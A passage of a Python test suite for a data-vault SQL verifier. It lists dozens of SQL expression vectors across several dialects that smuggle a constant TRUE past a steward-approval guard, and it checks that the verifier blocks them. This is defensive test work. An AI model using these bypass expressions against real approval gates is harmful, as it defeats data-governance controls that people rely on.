        "(SELECT sub.s.a.b FROM (SELECT STRUCT_PACK(a := STRUCT_PACK(b := TRUE)) AS s) AS sub)",
        "(SELECT arr FROM (SELECT [TRUE] AS arr))[1]",
        "((SELECT STRUCT_PACK(a := TRUE) AS st)).a",
        "LIST_FIRST([TRUE])",
        "LIST_LAST([TRUE])",
        "ARRAY_EXTRACT([TRUE], 1)",
        "ARRAY_SLICE([TRUE], 1, 1)[1]",
        "LIST_SLICE([TRUE], 1, 1)[1]",
        "MAP(['a'], [TRUE])['a']",
        "MAP {'a': TRUE}['a']",
        "((STRUCT_PACK(a := STRUCT_PACK(b := TRUE))).a).b",
        "([[TRUE]])[1][1]",
        "LIST_EXTRACT(LIST_EXTRACT([[TRUE]], 1), 1)",
    ):
        assert ddb_live.execute(
            f"SELECT COUNT(*) FROM staging_s AS s WHERE {live_expr} = ANY(s.b)"
        ).fetchone()[0] == 1, live_expr
    ddb_live.close()

    blocked_vectors = (
        ("duckdb_local", "(SELECT u.b FROM (SELECT [TRUE] AS arr) AS t, UNNEST(t.arr) AS u(b))"),
        ("duckdb_local", "(SELECT u.b FROM (SELECT [TRUE] AS arr) AS t CROSS JOIN UNNEST(t.arr) AS u(b))"),
        ("duckdb_local", "(WITH c AS (SELECT [TRUE] AS arr) SELECT u.b FROM c, UNNEST(c.arr) AS u(b))"),
        ("duckdb_local", "(SELECT u.a FROM (SELECT [STRUCT_PACK(a := TRUE)] AS arr) AS t, UNNEST(t.arr) AS u)"),
        ("duckdb_local", "(SELECT u.a.b FROM (SELECT [STRUCT_PACK(a := STRUCT_PACK(b := TRUE))] AS arr) AS t, UNNEST(t.arr) AS u)"),
        ("postgres", "(SELECT u FROM UNNEST(ARRAY[TRUE]) AS u)"),
        ("postgres", "(SELECT u.u FROM UNNEST(ARRAY[TRUE]) AS u)"),
        ("duckdb_local", "(SELECT st.a FROM (SELECT STRUCT_PACK(a := TRUE) AS st) AS sub)"),
        ("duckdb_local", "(SELECT t.a FROM (SELECT STRUCT_PACK(a := TRUE) AS st) AS s2, (SELECT s2.st.a) AS t)"),
        ("duckdb_local", "(SELECT sub.s.a.b FROM (SELECT STRUCT_PACK(a := STRUCT_PACK(b := TRUE)) AS s) AS sub)"),
        ("duckdb_local", "(SELECT arr FROM (SELECT [TRUE] AS arr))[1]"),
        ("duckdb_local", "LIST_EXTRACT((SELECT [TRUE]), 1)"),
        ("databricks_uc", "ELEMENT_AT((SELECT ARRAY(TRUE)), 1)"),
        ("duckdb_local", "((SELECT STRUCT_PACK(a := TRUE) AS st)).a"),
        ("duckdb_local", "STRUCT_EXTRACT((SELECT STRUCT_PACK(a := TRUE)), 'a')"),
        ("duckdb_local", "ARRAY_EXTRACT([TRUE], 1)"),
        ("duckdb_local", "ARRAY_VALUE(TRUE)[1]"),
        ("duckdb_local", "LIST_FIRST([TRUE])"),
        ("duckdb_local", "LIST_LAST([TRUE])"),
        ("duckdb_local", "ARRAY_FIRST([TRUE])"),
        ("duckdb_local", "ARRAY_LAST([TRUE])"),
        ("duckdb_local", "LIST_ELEMENT([TRUE], 1)"),
        ("snowflake", "GET(ARRAY_CONSTRUCT(TRUE), 0)"),
        ("snowflake", "GET(OBJECT_CONSTRUCT('a', TRUE), 'a')"),
        ("duckdb_local", "ARRAY_SLICE([TRUE], 1, 1)[1]"),
        ("duckdb_local", "LIST_SLICE([TRUE], 1, 1)[1]"),
        ("duckdb_local", "MAP(['a'], [TRUE])['a']"),
        ("duckdb_local", "MAP {'a': TRUE}['a']"),
        ("duckdb_local", "((STRUCT_PACK(a := STRUCT_PACK(b := TRUE))).a).b"),
        ("duckdb_local", "STRUCT_EXTRACT(STRUCT_EXTRACT(STRUCT_PACK(a := STRUCT_PACK(b := TRUE)), 'a'), 'b')"),
        ("duckdb_local", "([[TRUE]])[1][1]"),
        ("duckdb_local", "LIST_EXTRACT(LIST_EXTRACT([[TRUE]], 1), 1)"),
        ("databricks_uc", "ELEMENT_AT(ELEMENT_AT(ARRAY(ARRAY(TRUE)), 1), 1)"),
        ("duckdb_local", "(CASE WHEN NOT TRUE THEN 'ok' END)"),
        ("duckdb_local", "(CASE WHEN (SELECT FALSE) THEN 'ok' END)"),
        ("duckdb_local", "(CASE WHEN 1=2 THEN 'ok' END)"),
        ("duckdb_local", "(CASE WHEN COALESCE(FALSE, FALSE) THEN 'ok' END)"),
        ("duckdb_local", "(CASE 1 WHEN 2 THEN 'ok' END)"),
        ("duckdb_local", "(CASE NULL WHEN 1 THEN 'ok' END)"),
        ("duckdb_local", "IF(NOT TRUE, 'ok', NULL)"),
        ("duckdb_local", "IFF(FALSE, 'ok', NULL)"),
        ("snowflake", "IFF(FALSE, 'ok', NULL)"),
        ("duckdb_local", "NULLIF((SELECT 1), 1)"),
        ("duckdb_local", "NULLIF(CAST(1 AS INT), 1)"),
        ("duckdb_local", "(SELECT NULLIF(sub.x, 1) FROM (SELECT 1 AS x UNION ALL SELECT 1 AS x) AS sub LIMIT 1)"),
        ("duckdb_local", "(SELECT NULLIF(sub.x, 1) FROM (SELECT 1 AS x UNION ALL SELECT 2 AS x) AS sub LIMIT 1)"),
        ("postgres", "((DATE '2020-01-01', DATE '2020-01-02') OVERLAPS (DATE '2020-01-01', DATE '2020-01-02'))"),
        ("databricks_uc", "MAP_CONTAINS_KEY(MAP('a', 1), 'a')"),
        ("duckdb_local", "MAP_CONTAINS_ENTRY(MAP {'a': 1}, 'a', 1)"),
        ("duckdb_local", "JSON_VALID('{}')"),
        ("duckdb_local", "IS_VALID_JSON('{}')"),
        ("duckdb_local", "JSON_CONTAINS('{\"a\":1}', '1')"),
        ("duckdb_local", "ARRAY_HAS_ANY(s.a, s.b)"),
        ("duckdb_local", "STRUCT_CONTAINS(s.a, s.b)"),
        ("duckdb_local", "SIGNBIT(s.x)"),
        ("duckdb_local", "LIKE_ESCAPE(s.a, 'x', '\\')"),
        ("duckdb_local", "ILIKE_ESCAPE(s.a, 'x', '\\')"),
        ("duckdb_local", "NOT_LIKE_ESCAPE(s.a, 'x', '\\')"),
        ("duckdb_local", "NOT_ILIKE_ESCAPE(s.a, 'x', '\\')"),
        ("duckdb_local", "CAN_CAST_IMPLICITLY(s.a, 'INT')"),
        ("snowflake", "IS_VARIANT(s.v)"),
        ("snowflake", "IS_CHAR(s.v)"),
        ("snowflake", "IS_REAL(s.v)"),
        ("snowflake", "IS_TIME(s.v)"),
        ("snowflake", "IS_TIMESTAMP_LTZ(s.v)"),
        ("snowflake", "IS_TIMESTAMP_NTZ(s.v)"),
        ("snowflake", "IS_TIMESTAMP_TZ(s.v)"),
        ("snowflake", "IS_BINARY(s.v)"),
        ("snowflake", "IS_DATE_VALUE(s.v)"),
    )
    for b_tid, b_expr in blocked_vectors:
        dialect = get_dialect_profile(b_tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {b_expr} = ANY(s.b)"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {b_expr} = ANY(s.b)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            b_tid, b_expr
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, b_tid, extra_unstructured_links=["lnk_u"])
        ), (b_tid, b_expr)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, b_tid)
        ), (b_tid, b_expr)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(
                b_tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
            )
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    # 5. Valid non-boolean controls (must pass with [])
    valid_controls = (
        ("duckdb_local", "['a', 'b'][1]"),
        ("duckdb_local", "s.arr[1]"),
        ("duckdb_local", "MAP {'a': 1}['a']"),
        ("duckdb_local", "MAP(['a', 'b'], [1, TRUE])['a']"),
        ("duckdb_local", "CASE WHEN s.id = 1 THEN 'a' ELSE 'b' END"),
        ("duckdb_local", "CASE WHEN s.id = 1 THEN 'a' ELSE 'c' END"),
        ("duckdb_local", "CASE 1 WHEN 1 THEN 'ok' END"),
        ("duckdb_local", "FIRST_VALUE(s.x) OVER ()"),
        ("duckdb_local", "(SELECT u.b FROM (SELECT ['ok'] AS arr) AS t, UNNEST(t.arr) AS u(b))"),
        ("duckdb_local", "(SELECT u.a FROM (SELECT [STRUCT_PACK(a := 1)] AS arr) AS t, UNNEST(t.arr) AS u)"),
        ("duckdb_local", "(SELECT st.a FROM (SELECT STRUCT_PACK(a := 1) AS st) AS sub)"),
        ("postgres", "(SELECT u FROM UNNEST(ARRAY['ok']) AS u)"),
        ("duckdb_local", "(SELECT NULLIF(sub.x, 3) FROM (SELECT 1 AS x UNION ALL SELECT 2 AS x) AS sub LIMIT 1)"),
    )
    for ok_tid, ok_expr in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} = ANY(s.arr)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)



    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter32_kleene_3vl_init_smap_unnest_containers_and_quoted_show() -> None:
    """Remediate Iter-31 Kleene 3VL, init_smap, UNNEST, container, and quoted SHOW gaps."""
    import duckdb

    from opendv.storage._bool_expr_const import UNKNOWN, eval_const_lit
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    # 1. eval_const_lit OFFSET rejection
    assert eval_const_lit(sqlglot.parse_one("SELECT 1 OFFSET 1", read="duckdb")) is UNKNOWN

    # 2. Live DuckDB proof of Iter-31 bypasses + valid controls
    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, b BOOLEAN[], arr VARCHAR[])")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'])")
    ddb.execute("CREATE TABLE staging.t2 (x VARCHAR)")
    ddb.execute("INSERT INTO staging.t2 VALUES ('ok')")
    for live_expr in (
        "(CASE WHEN (NULL OR s.hk = 'k1') THEN TRUE ELSE 'false' END)",
        "(CASE WHEN COALESCE(NULL AND s.id = 1, TRUE) THEN 'false' ELSE TRUE END)",
        "(SELECT UNNEST([TRUE]))",
        "(SELECT UNNEST([TRUE]) AS x)",
        "(SELECT UNNEST([STRUCT_PACK(a := TRUE)]).a)",
        "(SELECT x FROM (SELECT UNNEST([TRUE]) AS x) AS t)",
        "([TRUE])[1:1][1]",
        "LIST_EXTRACT(([TRUE])[1:1], 1)",
        "MAP_EXTRACT(MAP {'a': TRUE}, 'a')[1]",
        "MAP_VALUES(MAP {'a': TRUE})[1]",
        "([TRUE] || [FALSE])[1]",
        "ARRAY_CONCAT([TRUE], [FALSE])[1]",
        "LIST_CONCAT([TRUE], [FALSE])[1]",
        "ARRAY_APPEND([FALSE], TRUE)[2]",
        "LIST_APPEND([], TRUE)[1]",
        "ARRAY_PREPEND(TRUE, [FALSE])[1]",
        "LIST_PREPEND(TRUE, [])[1]",
        "ARRAY_REVERSE([TRUE])[1]",
        "LIST_REVERSE([TRUE])[1]",
        "ARRAY_POP_BACK([TRUE, FALSE])[1]",
        "ARRAY_POP_FRONT([FALSE, TRUE])[1]",
        "LIST_DISTINCT([TRUE])[1]",
        "FLATTEN([[TRUE]])[1]",
        "MAP_FROM_ENTRIES([('a', TRUE)])['a']",
        "STRUCT_INSERT(STRUCT_PACK(x := 1), a := TRUE).a",
        "CAST(JSON_EXTRACT('{\"b\": true}', '$.b') AS BOOLEAN)",
        "COALESCE([TRUE], [FALSE])[1]",
        "IF(s.id = 2, [TRUE], [FALSE])[1]",
        "(CASE WHEN s.id = 2 THEN [TRUE] ELSE [FALSE] END)[1]",
        "(SELECT sub.a.b FROM (SELECT (SELECT STRUCT_PACK(b := TRUE)) AS a) AS sub)",
        "(SELECT sub.a.b FROM (SELECT [STRUCT_PACK(b := TRUE)][1] AS a) AS sub)",
        "(SELECT u.b FROM UNNEST(ARRAY_SLICE([TRUE], 1, 1)) AS u(b))",
    ):
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {live_expr} = ANY(s.b)"
        ).fetchone()[0] == 1, live_expr

    for ctrl_q in (
        "SELECT s.hk FROM staging.s AS s WHERE (CASE WHEN (NULL OR s.hk = 'k1') THEN 'ok' ELSE 'no' END) = ANY(s.arr)",
        "SELECT s.hk FROM staging.s AS s WHERE (CASE WHEN NOT (NULL AND s.id = 1) THEN 'ok' ELSE 'no' END) = ANY(s.arr)",
        "SELECT s.hk FROM staging.s AS s WHERE (SELECT sub.ok FROM (SELECT TRUE AS x) AS t JOIN (SELECT COALESCE(x, 'abc') AS ok FROM staging.t2) AS sub ON TRUE) = ANY(s.arr)",
    ):
        assert ddb.execute(ctrl_q).fetchall() == [("k1",)], ctrl_q
    ddb.close()

    # 3. Quoted-noun subquery SHOW across 8/8 dialects
    for tid in SQL_TARGET_IDS:
        show_sat = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            'SELECT t.name, CURRENT_TIMESTAMP, \'SRC\', \'x\' FROM (SHOW "TABLES") AS t'
        )
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(show_sat, tid)
        ), tid
        with pytest.raises(OpenDVError) as exc_sh:
            gate.verify_sql_ast(tid, show_sat, ir=ir)
        assert exc_sh.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_sh.value.exit_code == 50

    # 4. Blocked expression vectors (Kleene 3VL, 3VL extensions, DECODE, scalar UNNEST, slices, combinators)
    blocked_exprs = (
        ("duckdb_local", "(CASE WHEN (NULL OR s.hk = 'k1') THEN TRUE ELSE 'false' END)"),
        ("duckdb_local", "(CASE WHEN COALESCE(NULL AND s.id = 1, TRUE) THEN 'false' ELSE TRUE END)"),
        ("duckdb_local", "CASE WHEN 1 > 2 THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN 1 < 2 THEN NULL ELSE 'ok' END"),
        ("duckdb_local", "CASE WHEN 1 IS NULL THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN 1 IS NOT NULL THEN NULL ELSE 'ok' END"),
        ("duckdb_local", "CASE WHEN 1 IN (2, 3) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN 1 BETWEEN 2 AND 3 THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN 'a' LIKE 'b' THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN 1 + 1 = 3 THEN 'ok' END"),
        ("duckdb_local", "CASE (1 + 1) WHEN 3 THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN CAST('false' AS BOOLEAN) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN TRY_CAST('false' AS BOOLEAN) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (SELECT FALSE FROM (SELECT 1) AS t) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (WITH c AS (SELECT FALSE AS x) SELECT x FROM c) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (CASE WHEN TRUE THEN FALSE END) THEN 'ok' END"),
        ("duckdb_local", "CASE (SELECT 1 OFFSET 1) WHEN 1 THEN 'ok' ELSE TRUE END"),
        ("duckdb_local", "IF(1 > 2, 'ok', NULL)"),
        ("snowflake", "IFF(1 > 2, 'ok', NULL)"),
        ("snowflake", "DECODE(1, 2, 'ok')"),
        ("snowflake", "DECODE(1, 2, 'ok', NULL)"),
        ("duckdb_local", "NULLIF(1 + 1, 2)"),
        ("duckdb_local", "(SELECT UNNEST([TRUE]))"),
        ("duckdb_local", "(SELECT UNNEST([TRUE]) AS x)"),
        ("duckdb_local", "(SELECT UNNEST([STRUCT_PACK(a := TRUE)]).a)"),
        ("duckdb_local", "(SELECT x FROM (SELECT UNNEST([TRUE]) AS x) AS t)"),
        ("bigquery", "(SELECT UNNEST([TRUE]))"),
        ("duckdb_local", "([TRUE])[1:1][1]"),
        ("postgres", "(ARRAY[TRUE])[1:1][1]"),
        ("duckdb_local", "LIST_EXTRACT(([TRUE])[1:1], 1)"),
        ("duckdb_local", "MAP_EXTRACT(MAP {'a': TRUE}, 'a')[1]"),
        ("duckdb_local", "MAP_VALUES(MAP {'a': TRUE})[1]"),
        ("duckdb_local", "([TRUE] || [FALSE])[1]"),
        ("duckdb_local", "ARRAY_CONCAT([TRUE], [FALSE])[1]"),
        ("duckdb_local", "LIST_CONCAT([TRUE], [FALSE])[1]"),
        ("duckdb_local", "ARRAY_APPEND([FALSE], TRUE)[2]"),
        ("duckdb_local", "LIST_APPEND([], TRUE)[1]"),
        ("duckdb_local", "ARRAY_PREPEND(TRUE, [FALSE])[1]"),
        ("snowflake", "ARRAY_PREPEND(TRUE, [FALSE])[1]"),
        ("duckdb_local", "LIST_PREPEND(TRUE, [])[1]"),
        ("duckdb_local", "ARRAY_REVERSE([TRUE])[1]"),
        ("duckdb_local", "LIST_REVERSE([TRUE])[1]"),
        ("duckdb_local", "ARRAY_POP_BACK([TRUE, FALSE])[1]"),
        ("duckdb_local", "ARRAY_POP_FRONT([FALSE, TRUE])[1]"),
        ("postgres", "ARRAY_REMOVE(ARRAY[TRUE, FALSE], FALSE)[1]"),
        ("duckdb_local", "ARRAY_REMOVE([TRUE, FALSE], FALSE)[1]"),
        ("duckdb_local", "LIST_DISTINCT([TRUE])[1]"),
        ("duckdb_local", "FLATTEN([[TRUE]])[1]"),
        ("duckdb_local", "MAP_FROM_ENTRIES([('a', TRUE)])['a']"),
        ("duckdb_local", "STRUCT_INSERT(STRUCT_PACK(x := 1), a := TRUE).a"),
        ("snowflake", "OBJECT_CONSTRUCT('a', TRUE):a"),
        ("duckdb_local", "CAST(JSON_EXTRACT('{\"b\": true}', '$.b') AS BOOLEAN)"),
        ("duckdb_local", "COALESCE([TRUE], [FALSE])[1]"),
        ("duckdb_local", "IF(s.id = 1, [TRUE], [FALSE])[1]"),
        ("duckdb_local", "(CASE WHEN s.id = 1 THEN [TRUE] ELSE [FALSE] END)[1]"),
        ("duckdb_local", "(SELECT sub.a.b FROM (SELECT (SELECT STRUCT_PACK(b := TRUE)) AS a) AS sub)"),
        ("duckdb_local", "(SELECT sub.a.b FROM (SELECT [STRUCT_PACK(b := TRUE)][1] AS a) AS sub)"),
        ("duckdb_local", "(SELECT u.b FROM UNNEST(ARRAY_SLICE([TRUE], 1, 1)) AS u(b))"),
    )
    for b_tid, b_expr in blocked_exprs:
        dialect = get_dialect_profile(b_tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {b_expr} = ANY(s.b)"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {b_expr} = ANY(s.b)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            b_tid, b_expr
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, b_tid, extra_unstructured_links=["lnk_u"])
        ), (b_tid, b_expr)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, b_tid)
        ), (b_tid, b_expr)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(b_tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    # 5. Enclosing FROM/JOIN/CTE/UNNEST init_smap & scalar aggregate smuggling vectors
    stmt_vectors = (
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "JOIN (SELECT 'k1' AS k, TRUE AS b) AS sub ON s.hk = sub.k "
            "WHERE s.steward_gate_status = 'APPROVED' AND sub.b = ANY(s.b)",
            "DV-AST-007",
            True,
        ),
        (
            "duckdb_local",
            "WITH c AS (SELECT 'k1' AS k, TRUE AS b) "
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "JOIN c ON s.hk = c.k "
            "WHERE s.steward_gate_status = 'APPROVED' AND c.b = ANY(s.b)",
            "DV-AST-007",
            True,
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "JOIN (SELECT 'k1' AS k, TRUE AS b) AS sub ON s.hk = sub.k "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND sub.b = ANY(SELECT COUNT(*) > 0 FROM staging.s)",
            "DV-AST-007",
            True,
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "JOIN (SELECT 'k1' AS k, STRUCT_PACK(a := TRUE) AS st) AS sub ON s.hk = sub.k "
            "WHERE s.steward_gate_status = 'APPROVED' AND sub.st.a = ANY(s.b)",
            "DV-AST-007",
            True,
        ),
        (
            "duckdb_local",
            "WITH c AS (SELECT FALSE AS f) "
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (CASE WHEN (SELECT c.f FROM c) THEN 'ok' END) = ANY(s.b)",
            "DV-AST-007",
            True,
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s "
            "CROSS JOIN UNNEST([TRUE]) AS u(b) WHERE u.b = ANY(s.b)",
            "DV-AST-006",
            False,
        ),
    )
    for s_tid, s_sql, rule_id, is_lnk in stmt_vectors:
        dialect = get_dialect_profile(s_tid).sqlglot_dialect or "duckdb"
        if is_lnk:
            assert has_steward_approved_guard(sqlglot.parse_one(s_sql, read=dialect)) is False, s_sql
            assert any(
                d.rule_id == rule_id and d.severity == "BLOCKER"
                for d in verifier.verify_sql(s_sql, s_tid, extra_unstructured_links=["lnk_u"])
            ), s_sql
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(s_tid, s_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50
        else:
            assert any(
                d.rule_id == rule_id and d.severity == "BLOCKER"
                for d in verifier.verify_sql(s_sql, s_tid)
            ), s_sql
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(s_tid, s_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

    # 6. Valid non-boolean controls (including Kleene 3VL & has_opaque COALESCE controls)
    valid_controls = (
        ("duckdb_local", "(CASE WHEN (NULL OR s.hk = 'k1') THEN 'ok' ELSE 'no' END)"),
        ("duckdb_local", "(CASE WHEN NOT (NULL AND s.id = 1) THEN 'ok' ELSE 'no' END)"),
        (
            "duckdb_local",
            "(SELECT sub.ok FROM (SELECT TRUE AS x) AS t "
            "JOIN (SELECT COALESCE(x, 'abc') AS ok FROM staging.t2) AS sub ON TRUE)",
        ),
        ("snowflake", "DECODE(1, 1, 'ok', NULL)"),
        ("duckdb_local", "STRUCT_INSERT(STRUCT_PACK(x := 'ok'), a := TRUE).x"),
        ("duckdb_local", "MAP_EXTRACT(MAP {'a': 'ok', 'b': TRUE}, 'a')[1]"),
        ("duckdb_local", "MAP_FROM_ENTRIES([('a', 'ok'), ('b', TRUE)])['a']"),
        ("duckdb_local", "(SELECT UNNEST(['ok']))"),
        ("duckdb_local", "(['ok'])[1:1][1]"),
        ("snowflake", "OBJECT_CONSTRUCT('a', 'ok', 'b', TRUE):a"),
    )
    for ok_tid, ok_expr in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} = ANY(s.arr)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)



    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter33_subquery_shadowing_containers_lambdas_3vl_and_fail_closed() -> None:
    """Remediate Iter-32 shadowing, Subquery wrapper, container/lambda, 3VL, and fail-closed gaps."""
    import duckdb

    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    # 1. Live DuckDB proof of Iter-32 bypasses & valid controls
    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[])"
    )
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'])")
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")

    for live_expr in (
        "(CASE WHEN ((SELECT 1 AS x) LIMIT 0) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN ((SELECT 1 AS x) OFFSET 1) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN ((SELECT 1) ORDER BY 1 LIMIT 0) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN ((WITH c AS (SELECT 1 AS x) SELECT x FROM c) LIMIT 0) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN (WITH c AS ((SELECT 1 AS x) LIMIT 0) SELECT x FROM c) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN (SELECT 1 FROM (SELECT 1) AS t TABLESAMPLE BERNOULLI (0 PERCENT)) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN (SELECT 1 FROM ((SELECT 1) TABLESAMPLE BERNOULLI (0 PERCENT)) AS t) IS NULL THEN TRUE ELSE 'false' END)",
        "ARRAY_SORT([TRUE])[1]",
        "LIST_SORT([TRUE])[1]",
        "LIST_REVERSE_SORT([TRUE])[1]",
        "ARRAY_REVERSE_SORT([TRUE])[1]",
        "LIST_PACK(TRUE)[1]",
